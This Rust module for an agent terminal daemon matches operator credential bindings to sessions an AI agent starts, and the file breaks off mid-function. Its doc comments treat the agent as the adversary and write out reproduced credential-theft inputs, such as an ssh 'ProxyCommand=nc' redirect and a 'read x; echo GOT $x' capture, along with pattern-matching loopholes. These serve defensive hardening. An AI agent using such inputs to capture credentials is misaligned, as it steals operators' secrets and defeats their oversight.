//! §9.6's operator bindings: what a binding is matched against, how many
//! times one may fire in a session, and where the keychain step sits in
//! §5.2's resolution order.
//!
//! **This is the file REQ-SEC-012 either holds in or does not, and the
//! claim it holds is narrower than "the agent supplies no input here" —
//! which would be false.** §9.6 is explicit about what is closed: *"No
//! binding matches → fall through to the human-prompt path. There is no
//! 'agent asks for a named secret' API at all."* What the agent cannot do
//! is **name** anything: not the reference, not the provider, not the
//! binding.
//!
//! **The precise statement is about [`autofill`]'s signature, not about
//! this module's.** `autofill(security, session, append_newline, audit)`
//! has no parameter `request_secret_input`'s `prompt_text` could be passed
//! in. Saying that of the *module* would be false and is worth not saying:
//! [`select`] is `pub` and takes a bare `command_line: &str` and
//! `prompt_line: &str`, and so — privately — do `matches` (the same pair)
//! and `pattern_matches` (one `subject: &str`). What makes those safe is
//! not their signatures but their caller: `select` has exactly one
//! non-test caller, `autofill`, which builds both subjects from the
//! session.
//!
//! **`autofill` is not the daemon's only entry point into this module.**
//! An earlier revision of this header said it was, and the claim was
//! false; it is replaced with one a reader can falsify in one command
//! rather than trust. `grep -rn 'secret::binding::' crates/holdfast-core/src`
//! is the whole of the daemon's use of this module — every other spelling
//! would have to come through `secret/mod.rs`'s `pub use` list, which
//! nothing outside this file imports today — and it is **four** functions,
//! every one of them called from `mcp::tools`:
//!
//! * [`autofill`] — §5.2's step 1. Parameters: the operator's config and
//!   the session, and nothing else.
//! * [`autofill_approved`] — §17.5's `Approved` arm. Its one extra
//!   parameter is the binding **name** a human approved, which came from
//!   the operator's config by way of [`Approval`].
//! * [`keychain_step_runs`] — a guard deciding whether to suspend into
//!   `spawn_blocking` at all. Its only argument is
//!   `SecurityConfig::secret_provider`, an operator's config value out of
//!   a three-word vocabulary.
//! * [`redacted_command_line`] — added for GH #45, and **its second and
//!   third arguments are the agent's own strings**.
//!
//! **The grep returns a good deal more than those four lines, and an
//! earlier revision of this paragraph excused exactly one of the
//! extras** — so a reader running the command did not land where it said
//! they would. What else comes back: a `use` line in `mcp::tools`, one
//! type reference (`session::binding_uses`, naming [`BindingUses`]), and
//! mentions inside doc comments across several files, this one included.
//! **The calls are the lines with a `(` after the function name**, and
//! they are the four listed above. No count is given for the rest on
//! purpose: a number in prose here is a number that goes stale on the
//! next commit, which is the mistake this paragraph has now made twice.
//!
//! **Two corrections in one paragraph, and both are the same mistake.**
//! It said *"two functions"* — omitting `autofill_approved`, which has
//! been called from `mcp::tools` since 0.0.7 — and it said *"neither has
//! a parameter an agent-supplied string could enter"*, which the commit
//! that added `redacted_command_line` falsified without touching the
//! sentence. A paragraph that invites a grep has to survive it.
//!
//! **The claim that does survive is about *selection*, and it is the one
//! REQ-SEC-012 rests on**: nothing an agent writes may choose which
//! binding fires or what is looked up. `redacted_command_line` chooses
//! nothing and looks nothing up — it takes the session's command line and
//! hands back a string to *show a human*. It is a sink, not a subject,
//! and the two are kept apart deliberately; see its own doc for why
//! unifying them would break the matcher.
//!
//! [`Approval`]: crate::secret::Approval
//!
//! **And one of the matcher's two subjects is the agent's own string.**
//! `Session.command` and `Session.args` are the agent's `start_session`
//! arguments, stored verbatim — so `match_command`'s entire subject is
//! something the agent wrote. That is **§9.6's design as this
//! implementation reads it, and §9.6's own text does not say so**: its
//! bullet reads *"The agent has no input into which entry is selected"*,
//! which is not true of any implementation that matches on a command line
//! the agent chose, including the one §9.6 itself describes. The spec line
//! needs the same correction this header just made; that is recorded here
//! rather than repaired from this lane. What is defensible, and what this
//! module relies on, is narrower: an operator binding that fires on
//! `ssh prod-01` firing for an agent that ran `ssh prod-01` **is** the
//! feature, and the protection is that to match, the agent must actually
//! *run* that command line, under a PTY, in a session an operator can
//! watch. The other subject — the prompt line — is the child's own output
//! and is influenced only through what the child prints.
//!
//! ## `match_command` must cover the **whole** joined line (GH #45)
//!
//! Through 0.0.7 this module matched with `Regex::is_match`, which is
//! unanchored at both ends, so an operator's pattern constrained only a
//! *prefix* of a string the agent writes in full. **§9.6's own published
//! example was exploitable exactly as published**:
//! `^ssh\s+(\S+@)?prod-0[12]\b` is matched by
//!
//! ```text
//! start_session("ssh", ["prod-01", "-o", "ProxyCommand=nc 127.0.0.1 2222"])
//! ```
//!
//! — the operator's binding fires, and the credential is typed into an
//! `ssh` whose transport the agent has pointed at its own endpoint. That
//! was driven end to end against a real daemon rather than inferred: the
//! call returned `secret_provided`, the audit trail named the binding, and
//! `read_output` handed back the prompt and the value. [`whole_line`] is
//! the repair — the pattern is compiled inside `\A(?:…)\z`, so an argument
//! the pattern never examined is now an argument that stops it matching.
//!
//! **Anchoring alone would have been the wrong shape of fix, and its
//! second half lives in `config.rs`.** The first operator whose
//! legitimate session stops matching writes `.*` under time pressure,
//! silently, and the hole is back — so `Config::validate` refuses a
//! `match_command` that gives the line back to the agent — at either end
//! and, since round 4, anywhere in between.
//!
//! Both ends, because the reflex has two spellings and only one of them
//! is the original issue. A *leading* `.*` is not the lesser case:
//! `^.*ssh\s+prod-01$` is matched by a session whose command line is
//! `sh -c "…read x; echo GOT $x; ssh prod-01"`, so the credential is
//! typed into the agent's own program and `ssh` is never reached at all.
//!
//! **And the middle, which is where an `ssh` command line takes its
//! options.** `^ssh.*prod-01$` pins both ends and admits `ssh -o
//! ProxyCommand=nc 127.0.0.1 2222 prod-01` — GH #45's own reproduction
//! line. It loaded through round 3, whose corpus had no probe that
//! reached past either end.
//!
//! **How that refusal works changed in round 3, and the change is worth
//! knowing before reading `config.rs`.** It used to be a *syntactic*
//! scanner that peeled anchors and groups off each end looking for `.*`
//! and its friends; it grew to ~180 lines and a review still drove twenty
//! accepted spellings past it. It is now *behavioural*: each binding
//! carries a `match_example`, and the pattern — wrapped by [`whole_line`],
//! so it is this module's regex being asked — must match that example and
//! must **not** match it under a corpus of hostile transformations
//! (appended, spliced in at a token boundary, prepended, replaced).
//! `config::admits_only_its_example` carries the reasoning and, more
//! importantly, what it still does not close — including the part that
//! **cannot** be closed by a corpus, since a corpus is a finite
//! approximation of "what does this pattern admit" and a pattern can be
//! tailored around any known set of probes.
//!
//! Two live holes this header could previously only warn about are closed
//! by the same line, and both are pinned by rows below. **The
//! word-boundary straddle**: `match_command = "ssh\\s+prod-01"` used to be
//! satisfied by `start_session("cat", ["x", "ssh prod-01 y"])`, whose
//! joined line is `cat x ssh prod-01 y`, so the credential went to `cat`,
//! which echoed it straight into the ring buffer. It no longer matches,
//! because the pattern reaches neither end. And **`match_command = ""`**
//! now matches only the empty subject — and a session's command line
//! always has a command in it. It is also **no longer config-legal**: an
//! earlier revision of this paragraph said it was, which stopped being
//! true when round 3 made `match_example` required and judged
//! `match_command` against it, since the empty pattern cannot match a
//! non-empty example. It reaches [`matches`] only from a `SecurityConfig`
//! built in Rust, which is what this module's own rows do — see
//! `every_fixture_pattern_is_one_an_operator_could_actually_load`.
//!
//! ## `match_prompt` is **not** a security control
//!
//! It sits beside `match_command` in the config, in §9.6 and in this
//! header, and structural proximity reads as equivalent purpose. It is
//! not equivalent, and this section exists because earlier revisions of
//! all three let a reader infer that it was. **`match_prompt` is an
//! operator convenience for disambiguating between prompts *inside a
//! session that has already matched*** — *"this credential is for the
//! login prompt, not the sudo prompt"* — and explicitly **not** a defence
//! against an agent.
//!
//! Three reasons, and they are why it gets no `match_example`-style check
//! (`config::admits_only_its_example` carries the same list at the site
//! that would have had to implement one):
//!
//! 1. **It cannot widen a selection, only narrow one.** [`matches`]
//!    requires `match_command` to match **and**, when `match_prompt` is
//!    non-empty, the prompt. An agent that satisfies `match_prompt` has
//!    already had to satisfy `match_command`, so the prompt clause only
//!    ever removes candidates. GH #45 was a *selection* hole; this field
//!    cannot produce one.
//! 2. **An open `match_prompt` is the documented default.** `""` already
//!    means "does not select on the prompt", so `.*` means what a
//!    permitted value means.
//! 3. **There is no hostile-probe corpus to write.** The agent chooses
//!    the child, therefore chooses the prompt: any pattern over prompt
//!    text is satisfied by an agent that has already passed
//!    `match_command`, because it prints whatever the pattern asks for.
//!
//! **A field presented as protective while providing none is the same
//! defect class that produced GH #45** — §9.6's *"to match, the agent
//! must actually run that command line"* was true and load-bearing in the
//! wrong direction. So nothing here describes `match_prompt` as
//! tightening anything.
//!
//! **It is deliberately *not* anchored**, and that follows from the above
//! rather than from symmetry with `match_command`. Its subject is the
//! child's own output rather than the agent's argument list, and an
//! operator's `(?i)password` is meant to find a word inside a line like
//! `ada@prod-01's password: `. Anchoring it would break every prompt
//! pattern §9.6 publishes and close nothing, because there is nothing
//! here to close.
//!
//! ## What this still does not close
//!
//! **The un-quoted join means one straddle survives**, in the one
//! direction the whole-line rule cannot see: `command` and `args` are
//! joined before matching, so `start_session("ssh prod-01", [])` produces
//! the same subject as `start_session("ssh", ["prod-01"])`. An agent that
//! can write a file whose *name* contains a space can therefore satisfy
//! an operator's whole-line pattern with a program of its own. Quoting
//! the join would close it and is not this fix: §9.6's model is a regex
//! over a command line, and a quoting scheme operators would have to
//! guess at trades one hazard for another. GH #46's operator-declared
//! session profiles — where the agent fills slots and never writes a
//! command line at all — retire the whole class.
//!
//! **And the credential's *effect* is not protected, only its bytes.** An
//! agent that can start `ssh prod-01` at all still ends up with an
//! interactive shell on the target once injection succeeds. What the
//! whole-line rule and the example check stop is theft of the **value**, for
//! reuse elsewhere and beyond this session's lifetime, which is why byte
//! theft was the thing closed first. Nothing here should be read as more
//! than that.
//!
//! ## The two subjects
//!
//! **`match_command` is matched against `command` and `args` joined with
//! single spaces and not shell-quoted.** The join is built here, at match
//! time, and no *record* carries this form: §9.4's `session_start` records
//! the two **element-wise, never joined**, and `mcp::tools`'
//! `session_record` gives the reason — *"joining with a space and redacting
//! the result would let a rule match across an argument boundary"*. So an
//! operator cannot lift a binding regex out of a log line; the plan claimed
//! otherwise and was wrong. Adding a joined field to the audit record to
//! make the claim true would trade a documentation convenience for the
//! redaction hazard that shape was chosen to avoid.
//!
//! **There is one other producer of the join, and it is not a subject.**
//! [`redacted_command_line`] renders the same two fields for
//! `BindingApprovalRequired`, so that a human approves *this command line
//! receiving this credential* rather than a binding name. It redacts
//! element-wise and then joins — the order the paragraph above requires —
//! and nothing matches against its output.
//!
//! The un-quoted join means an argument containing a space can straddle a
//! word boundary in the regex. That is a documented property and not a bug
//! to work around with a quoting scheme an operator would then have to
//! guess at — but it is a documented property whose **both sides the agent
//! controls**, and the paragraph above is where that is spelled out rather
//! than left for a reader to derive.
//!
//! **`match_prompt` is matched against the *unredacted* prompt line**
//! ([`crate::session::Session::detection`]), and that is deliberate: the
//! redacted form can carry `[REDACTED:…]` exactly where a prompt regex
//! expected text, so matching the redacted string would let the redactor
//! silently switch an operator's binding off. The unredacted line never
//! leaves the daemon on this path — it is compared against a regex and
//! dropped. Everything that *emits* a prompt line still emits the redacted
//! one, and `mcp::detection`'s §5.4 builder still applies REQ-O-013 on top
//! of that; §20.6 states outright that the emptying rule belongs to that
//! builder and **nowhere upstream**, so the matcher reads the detector's
//! line even when the response reports `""`.
//!
//! **One consequence, recorded and deliberately not fixed.** Resolution
//! success is observable by the agent — a credential arrives or it does
//! not. So an operator who wrote a `match_prompt` that *discriminates on
//! secret content* — `"(?i)password for ghp_[0-9A-Za-z]{36}"` — would
//! turn resolve/no-resolve into a **one-bit oracle over text the redactor
//! exists to hide**, and in principle an agent could binary-search
//! redacted prompt content through it. It is bounded because it takes the
//! **operator** to author the discriminating pattern, and the operator is
//! not the adversary here.
//!
//! It is written down chiefly as a warning to whoever later proposes
//! matching `match_prompt` against the **redacted** line "for safety".
//! That change reintroduces exactly the defect the paragraph above
//! prevents — a redactor silently switching an operator's binding off —
//! and it trades a hazard the operator has to build for one that arrives
//! by itself.
//!
//! ## `require_confirm` is two calls, not one
//!
//! §17.5's approval is a human round trip over a socket and [`autofill`]
//! is synchronous, so the two cannot be one function. A binding carrying
//! `require_confirm` answers [`FellThrough::NeedsApproval`] with its name
//! and provider; the async caller raises the approval, waits out
//! `min(binding_approval_timeout_secs, remaining / 2)`, and on `approve`
//! comes back through [`autofill_approved`] — which **re-runs the
//! selection** and resolves only if the session still selects the binding
//! whose name was approved. Nothing in between holds a reference.

use std::collections::BTreeMap;

use crate::attach::secret::SecretBytes;
use crate::audit::AuditLog;
use crate::config::{SecretBinding, SecurityConfig};
use crate::session::Session;

use super::provider::{resolve, ProviderError};

/// The session's own command line, as a binding matches it.
///
/// `command` then `args`, single spaces, **no shell quoting** — see the
/// module header for why there is no quoting scheme and why this string
/// exists only here.
pub fn command_line(command: &str, args: &[String]) -> String {
    if args.is_empty() {
        return command.to_string();
    }
    let mut line =
        String::with_capacity(command.len() + args.iter().map(|a| a.len() + 1).sum::<usize>());
    line.push_str(command);
    for arg in args {
        line.push(' ');
        line.push_str(arg);
    }
    line
}

/// The same line, for a **human** rather than for a matcher.
///
/// §17.5's approval asks somebody to agree that *this command line* may
/// receive *this credential*, so the line has to be on the frame. It also
/// has to cross the same boundary every other string does, and
/// `Session.command`/`args` are agent-authored: an agent that puts a token
/// in an argument would otherwise have `BindingApprovalRequired` carry it
/// to every attached client. So this rendering is redacted, on the rule
/// `AwaitingSecret.prompt_text` already follows.
///
/// **Element-wise, then joined — never the other way round.** §9.4's
/// `session_start` and `mcp::tools`' `session_record` both record the two
/// separately and give the reason: *"joining with a space and redacting
/// the result would let a rule match across an argument boundary"*. A rule
/// that fired across the join would blank out two arguments an operator
/// needs to read, in the one place they are being asked to make a
/// decision about them.
///
/// **Control characters are removed as well as secrets, and that is not
/// tidying.** A field whose entire purpose is to be *read* by a human is
/// defeated by an argument containing `\x1b[2K` or `\r`: the agent
/// rewrites or blanks the very line the operator is being asked to
/// approve, and can forge the diagnostic text around it. Redaction alone
/// does not touch them — no rule matches an escape sequence. Both run,
/// in one place, through [`redact_for_display`], whose doc carries the
/// argument for the order: stripping **second** would let the daemon
/// *repair* a credential the agent had smuggled past the redactor.
///
/// **Element-wise here too, and that is load-bearing rather than
/// incidental.** An unterminated escape in one argument must not reach
/// the next one, which is what a single pass over the joined line would
/// let it do. Pinned by
/// `an_unterminated_escape_in_one_argument_does_not_reach_the_next`.
///
/// **Not what [`select`] matches against, and the two must not be
/// unified.** The matcher reads the *unredacted, unstripped* join, for the
/// same reason `match_prompt` reads the unredacted prompt line: matching a
/// processed string would let the redactor silently switch an operator's
/// binding off — or, worse here, switch a *different* one on. It is also
/// what keeps the two honest about each other: an operator's pattern that
/// admits an argument containing an escape sequence still selects, and the
/// human is still shown a line they can read.
///
/// [`one_line_for_display`]: crate::output::ansi::one_line_for_display
pub fn redacted_command_line(
    rules: &crate::output::rules::RuleSet,
    command: &str,
    args: &[String],
) -> String {
    use crate::output::redact::redact_for_display;
    let args: Vec<String> = args.iter().map(|a| redact_for_display(rules, a)).collect();
    command_line(&redact_for_display(rules, command), &args)
}

/// Does §5.2's step 1 run at all?
///
/// `prompt` — the default — means it does not, and no provider subprocess
/// is spawned on any path. That is the shipped posture: the difference
/// between a default install that never touches a credential store and one
/// that touches it on every echo-off prompt.
///
/// The three spellings are `SecurityConfig::secret_provider`'s, validated
/// at load against `config::SECRET_PROVIDERS`. **Not**
/// `SecretBinding::provider`'s five (§9.6's stores) — two different
/// vocabularies live one struct apart and reading one as the other is the
/// mistake this function exists to make impossible to write twice.
pub fn keychain_step_runs(secret_provider: &str) -> bool {
    matches!(secret_provider, "keychain" | "both")
}

/// The first binding, **in configured order**, that matches this session.
///
/// §9.6: *"probed in configured order"*. `Vec` order is the config file's
/// order; nothing here sorts, indexes by name, or collects into a map,
/// because a map's iteration order would make `the_first_matching_binding_in_order_wins`
/// pass about half the time.
///
/// No match is **not an error** (§9.6). The caller falls through.
///
/// `prompt_line` is the unredacted line and **may be empty**: REQ-O-013's
/// two conditions (an active holdback, or a line that lost bytes off its
/// front at §4.1's 512-byte tail bound) are applied at the §5.4 response
/// builder rather than here, but a child that has simply written nothing
/// yet also has none. An empty line is read as *"no prompt observed"*, so
/// **a binding carrying a `match_prompt` does not select on it** — matching
/// `""` is a no-op against `(?i)password` and a silent match-everything
/// against `.*`, and which of those an operator gets should not depend on
/// a regex they wrote for a non-empty line.
pub fn select<'a>(
    bindings: &'a [SecretBinding],
    command_line: &str,
    prompt_line: &str,
) -> Option<&'a SecretBinding> {
    bindings
        .iter()
        .find(|b| matches(b, command_line, prompt_line))
}

/// One binding against one session's two subjects.
///
/// **The two subjects are not two gates**, and the `&&` below is where
/// that is visible: `match_command` is what *selects*, and `match_prompt`
/// — when an operator wrote one — only removes candidates it had already
/// selected. See the module header for why that makes it an operator
/// convenience rather than a security control, and why it gets no
/// load-time check of its own.
fn matches(binding: &SecretBinding, command_line: &str, prompt_line: &str) -> bool {
    // **The subject here is agent-authored** — see the module header — so
    // it is matched **whole** (GH #45). A pattern that constrains only a
    // prefix constrains only the part of the line the agent chose to leave
    // alone, which is what let `ssh prod-01 -o ProxyCommand=…` select an
    // operator's binding. The empty pattern is still read literally, and
    // under this rule it selects nothing a session can be.
    if !pattern_matches(
        binding,
        "match_command",
        &whole_line(&binding.match_command),
        command_line,
    ) {
        return false;
    }
    // An empty `match_prompt` is §9.6's "this binding does not select on
    // the prompt" — `config.rs` says so at the validation site and
    // deliberately does not special-case the empty regex there, which
    // leaves the reading to be applied here, at match time.
    //
    // **This early return is also the argument that `match_prompt` cannot
    // widen anything.** The command-line clause above has already run and
    // already said yes; everything from here can only turn a `true` into
    // a `false`. An operator's `.*` here means what `""` means, which is
    // why refusing `.*` at load would be refusing the default in a
    // different spelling.
    if binding.match_prompt.is_empty() {
        return true;
    }
    // Carrying a `match_prompt` and having no line to match it against is
    // *not a match*. See [`select`].
    if prompt_line.is_empty() {
        return false;
    }
    pattern_matches(binding, "match_prompt", &binding.match_prompt, prompt_line)
}

/// An operator's `match_command`, rewritten so it must cover the **whole**
/// joined command line (GH #45).
///
/// **Wrapped in `(?:…)`, and that group is the load-bearing half.**
/// Without it an operator's top-level alternation loses its meaning:
/// `ssh\s+prod-01|psql\s+-h\s+prod` anchored as `\Aa|b\z` reads *"`a` at
/// the start, or `b` at the end"* — which is neither of the two things
/// they wrote, and the first branch is a prefix match again, so
/// `ssh prod-01 -o ProxyCommand=…` selects the binding. Pinned by
/// `an_alternation_needs_the_group_or_the_prefix_match_comes_back`;
/// deleting the group leaves the rest of this module's suite green.
///
/// **`\A` and `\z` rather than `^` and `$`, and the honest reason is not
/// the one an earlier revision of this comment gave.** It claimed `$`
/// would let a trailing newline through, as Perl's does. **It does not**:
/// in `regex` 1.13.1 `$` is exactly `\z` with multi-line off, and `\Z`
/// does not compile at all. So `\A(?:p)\z` and `^(?:p)$` are
/// *behaviourally identical here*, no test can tell them apart, and a
/// review that mutated one into the other correctly found the whole suite
/// green. `config::tests::this_crates_dollar_is_end_of_text_not_end_of_line`
/// pins that fact so a crate upgrade that changes it fails loudly.
///
/// The spelling is still the right one, for two reasons that survive:
/// `\A`/`\z` mean end-of-*text* whatever flags the operator sets inside
/// the group, so nothing here depends on reading the scoping rules
/// correctly; and they do not depend on a crate default that could move.
/// That is a defensive choice, not a behavioural one, and it should not
/// be sold as a behavioural one.
///
/// The operator's own `^` and `$` are left in place and remain correct —
/// they are simply redundant now, which is why §9.6's published example
/// still reads naturally after the change.
///
/// **No `(?s)` is added.** Turning `.` into "any byte including newline"
/// would *widen* every pattern an operator wrote, in the one direction
/// this change exists to narrow.
///
/// **`pub(crate)` so `Config::validate` can compile the same string, and
/// that is the whole of GH #50.** The validator used to compile the
/// operator's source *bare* while the matcher compiled it wrapped, so the
/// two could disagree about whether a pattern was even a regex. It now
/// calls this, which makes disagreement impossible by construction rather
/// than by both sides remembering the same rule.
pub(crate) fn whole_line(pattern: &str) -> String {
    format!(r"\A(?:{pattern})\z")
}

/// Compile and apply one of a binding's two patterns.
///
/// **A pattern that will not compile is not a match**, and it says so in
/// `daemon.log`. `Config::validate` rejects both patterns at load, so a
/// loaded daemon cannot reach this branch; a `SecurityConfig` built in
/// Rust can. The alternative — panicking, or treating an uncompilable
/// pattern as a match — would turn a config-shaped mistake into either a
/// dead daemon or a binding that fires on everything.
///
/// For `match_command` the `pattern` handed here is [`whole_line`]'s
/// rewrite rather than the operator's source, so the `regex` error in the
/// diagnostic quotes the wrapped form. That is worth one confusing pair of
/// delimiters in a line an operator sees only for a config
/// `Config::validate` would already have refused: compiling the raw source
/// for the message and the wrapped one for the match would be two compiles
/// that could disagree.
///
/// The compile happens per call rather than once at load. Bindings are few
/// and a secret request is not a hot path; caching them would mean a
/// second copy of the config's patterns to keep in step with the first.
fn pattern_matches(binding: &SecretBinding, field: &str, pattern: &str, subject: &str) -> bool {
    match regex::Regex::new(pattern) {
        Ok(re) => re.is_match(subject),
        Err(e) => {
            // The binding **name** and the field, never the subject: the
            // command line is redactable but the prompt line here is the
            // unredacted one, and this module is the one place that holds
            // it. It does not go into a diagnostic.
            crate::diag!(
                "holdfast: secret binding `{}` has an uncompilable {field} and cannot \
                 match: {e}",
                binding.name
            );
            false
        }
    }
}

/// A binding that matched, whose provider answered.
///
/// **`reference` is not a field here and must not become one.** §9.6 and
/// REQ-SEC-016 put `binding_name` and `provider` on every surface and the
/// reference on none, and [`Autofill`] is the type the audit entry is built
/// from — so the reference is kept out of the audit trail by there being
/// nothing to put it in, the same way [`ProviderError`] keeps it out of a
/// diagnostic.
#[derive(Debug)]
pub struct Resolved {
    /// The override key, and the only identifying part of a binding any
    /// surface shows (§7.5, §7.6.3, §18.7).
    pub binding_name: String,
    /// The §9.6 config spelling, as [`super::ArgvProvider::as_str`] gives
    /// it — the same string `binding_resolved` and (0.0.8's)
    /// `BindingApprovalRequired` put on the wire.
    pub provider: String,
    /// How many times this binding has resolved **in this session**,
    /// counting this one. `1` on the first resolution.
    pub use_count: u32,
    /// The value, in the only type that can hold one.
    pub secret: SecretBytes,
}

/// Why §5.2's step 1 produced no value.
///
/// **Every variant means the same thing to the caller — fall through to
/// the prompt path — and they are distinguished only for a diagnostic.**
/// §9.6 states what a no-match does and never states what an exhausted
/// `max_uses` does; Decision 18 makes it the same, because falling through
/// is what every other no-resolution outcome in §9.6 does and because the
/// alternative is a tool error for a session that has a perfectly good
/// human sitting at it.
///
/// None of this reaches the agent. The agent learns that its call went to
/// the prompt path, which is what it learns for a session with no bindings
/// at all — an agent that could tell "your binding is exhausted" from "you
/// have no binding" could enumerate an operator's bindings by timing.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum FellThrough {
    /// `secret_provider = "prompt"`, the default. **Step 1 did not run**,
    /// and no binding was even looked at.
    ModeIsPrompt,
    /// The mode allows a credential store and no binding names this
    /// session. The ordinary outcome.
    NoBindingMatched,
    /// §9.6's `max_uses`, spent for this session. Per session and not per
    /// binding: two sessions matching one binding get one budget each,
    /// which is what *"bounds blast radius if a session is doing something
    /// unexpected"* means.
    Exhausted { binding_name: String, max_uses: u32 },
    /// The binding carries `require_confirm = true`, so it does not
    /// resolve **on this call** (§9.6, §17.5).
    ///
    /// **Still a fall-through, and that is the design rather than a
    /// leftover.** [`autofill`] is synchronous — it runs on a blocking
    /// pool because a provider is an OS process — and an approval is a
    /// human round trip over a socket. Fusing them would put a `.await`
    /// inside `spawn_blocking`. So this variant is the hand-off: the
    /// async caller broadcasts `BindingApprovalRequired`, waits out
    /// `min(binding_approval_timeout_secs, remaining / 2)`, and on
    /// `approve` calls [`autofill_approved`] with the name carried here.
    /// A caller that ignores it falls through to the human prompt, which
    /// is the safe reading of a confirmation that was not given.
    ///
    /// `provider` rides along because the frame carries it and because
    /// re-deriving it at the call site would mean handing a
    /// `&SecretBinding` across the seam — the one shape that puts the
    /// reference within reach of the wire (REQ-SEC-016).
    NeedsApproval {
        binding_name: String,
        provider: String,
    },
    /// The provider ran (or could not be started) and produced no value:
    /// a locked keyring, an item that is not there, a `wincred` binding on
    /// Unix, a store that is not installed, a lookup that outran
    /// `keychain_provider_timeout_secs`. **The [`ProviderError`] is
    /// deliberately not carried here** — it has already been logged by
    /// `provider.rs` at the one line rule 3 allows, and re-rendering it
    /// into a second place is how a stderr body or a reference reaches a
    /// surface twice.
    ProviderRefused {
        binding_name: String,
        provider: String,
    },
}

/// The outcome of §5.2's step 1.
#[derive(Debug)]
pub enum Autofill {
    Resolved(Resolved),
    FellThrough(FellThrough),
}

/// §5.2's step 1, whole: mode, match, budget, provider, audit entry.
///
/// ```text
/// 1. Keychain — only when `secret_provider` is `keychain` or `both`
///               AND a binding matches this session.
/// 2. Prompt   — broadcast AwaitingSecret and wait for a SecretInput.
/// ```
///
/// **This function blocks**, because [`resolve`] waits on an OS process.
/// Call it from `spawn_blocking` or the equivalent; a provider taking its
/// full `keychain_provider_timeout_secs` would otherwise stall a runtime
/// worker for ten seconds.
///
/// **The only inputs are the operator's config and the session.** There is
/// no `prompt_text` parameter and there must never be one — see the module
/// header.
pub fn autofill(
    security: &SecurityConfig,
    session: &Session,
    append_newline: bool,
    audit: &AuditLog,
) -> Autofill {
    // Step 1's gate. Checked **before** anything looks at a binding, so
    // that under the default mode no config-authored reference is even
    // read, let alone turned into an argv.
    if !keychain_step_runs(&security.secret_provider) {
        return Autofill::FellThrough(FellThrough::ModeIsPrompt);
    }

    let subject_command = command_line(&session.command, &session.args);
    // The **unredacted** line. See the module header: this is the one
    // place in the daemon that reads it, it is compared against a regex,
    // and it is dropped at the end of this function.
    let subject_prompt = session.detection().last_line;

    let Some(binding) = select(&security.secret_bindings, &subject_command, &subject_prompt) else {
        return Autofill::FellThrough(FellThrough::NoBindingMatched);
    };

    if binding.require_confirm {
        return Autofill::FellThrough(FellThrough::NeedsApproval {
            binding_name: binding.name.clone(),
            provider: binding.provider.clone(),
        });
    }

    resolve_selected(security, session, binding, append_newline, audit)
}

/// §17.5's `Approved` arm: the rest of §5.2's step 1, for a binding a
/// human has just approved **by name**.
///
/// **Blocking, like [`autofill`], and for the same reason.** The approval
/// round trip happens in the async caller between the two calls; this one
/// only spends the budget, runs the provider and writes the audit entry.
///
/// **It re-runs the selection rather than trusting a carried
/// `&SecretBinding`, and both halves of that matter.** Carrying the
/// binding across the approval wait would mean holding the *reference* in
/// a local across a human-scale delay, in the one module whose premise is
/// that the reference reaches nothing but an argv. And re-selecting is
/// also the stronger check: between the approval being raised and
/// answered the session's prompt line can move, which can change which
/// binding §9.6's *"probed in configured order"* picks. If the session no
/// longer selects the binding whose **name** was approved, this resolves
/// **nothing** — a human approved `prod-ssh`, and a different credential
/// is not what they approved.
///
/// The name and not an index or a pointer, because the name is what the
/// human was shown (§9.6: *"the only part of a binding any surface
/// shows"*), so the thing checked here is the thing that was agreed to.
pub fn autofill_approved(
    security: &SecurityConfig,
    session: &Session,
    approved_binding: &str,
    append_newline: bool,
    audit: &AuditLog,
) -> Autofill {
    if !keychain_step_runs(&security.secret_provider) {
        return Autofill::FellThrough(FellThrough::ModeIsPrompt);
    }
    let subject_command = command_line(&session.command, &session.args);
    let subject_prompt = session.detection().last_line;
    let Some(binding) = select(&security.secret_bindings, &subject_command, &subject_prompt) else {
        return Autofill::FellThrough(FellThrough::NoBindingMatched);
    };
    if binding.name != approved_binding {
        // Reported as *no binding matched*, which is what it is from the
        // caller's side and what every other fall-through looks like to
        // the agent. An agent that could tell "the approved binding is no
        // longer the selected one" from "you have no binding" could
        // enumerate an operator's bindings from the outside.
        crate::diag!(
            "holdfast: approval named `{approved_binding}` but the session now selects \
             `{}`; resolving nothing",
            binding.name
        );
        return Autofill::FellThrough(FellThrough::NoBindingMatched);
    }
    resolve_selected(security, session, binding, append_newline, audit)
}

/// Budget, provider, audit — the tail both entry points share.
///
/// One copy, because the `max_uses` claim and its release on failure are
/// a pair: a second copy is a second place the release can be forgotten,
/// and a forgotten release lets a locked keyring eat an operator's whole
/// budget with no credential ever resolved.
fn resolve_selected(
    security: &SecurityConfig,
    session: &Session,
    binding: &SecretBinding,
    append_newline: bool,
    audit: &AuditLog,
) -> Autofill {
    // §9.6's bound, claimed **before** the spawn and under the session's
    // own lock, so that "the third prompt in this session falls through"
    // is a fact rather than a race between two calls that both read the
    // count and then both incremented it.
    let Some(use_count) = session.claim_binding_use(&binding.name, binding.max_uses) else {
        return Autofill::FellThrough(FellThrough::Exhausted {
            binding_name: binding.name.clone(),
            max_uses: binding.max_uses.unwrap_or(0),
        });
    };

    match run_provider(binding, security, append_newline) {
        Ok(secret) => {
            let resolved = Resolved {
                binding_name: binding.name.clone(),
                provider: binding.provider.clone(),
                use_count,
                secret,
            };
            audit_binding_resolved(audit, &session.id, &resolved);
            Autofill::Resolved(resolved)
        }
        Err(_) => {
            // **The claim is given back.** A locked keyring or a store
            // that is not installed did not spend a use of the secret,
            // and an operator who wrote `max_uses = 2` against a flaky
            // provider must not find their budget gone without a single
            // credential having been resolved. The reservation is what
            // makes the bound atomic; this is what keeps it a bound on
            // *resolutions*, which is what §9.6 counts.
            session.release_binding_use(&binding.name);
            Autofill::FellThrough(FellThrough::ProviderRefused {
                binding_name: binding.name.clone(),
                provider: binding.provider.clone(),
            })
        }
    }
}

/// §9.4's `binding_resolved` (added at rev. 22; moved out of §18.7's prose
/// into §9.4's table at rev. 48 with no field change).
///
/// `{binding_name, provider, session_id, use_count}` — **never the
/// reference, never the value** (§9.6, REQ-SEC-016). The natural mistake
/// is one `serde_json::to_value(binding)` away and would put the reference
/// in the audit trail; the defence is that [`Resolved`] has no field able
/// to hold one, so the mistake does not type-check into this call.
///
/// **`session_id` appears twice on purpose** — as `AuditLog::record`'s own
/// parameter, which every kind carries, *and* inside `fields`, because
/// §9.4's row for this kind lists it and that table is the catalogue.
/// Costs one duplicated key in the line and keeps the row readable as
/// written.
fn audit_binding_resolved(audit: &AuditLog, session_id: &str, resolved: &Resolved) {
    audit.record(
        "binding_resolved",
        Some(session_id),
        serde_json::json!({
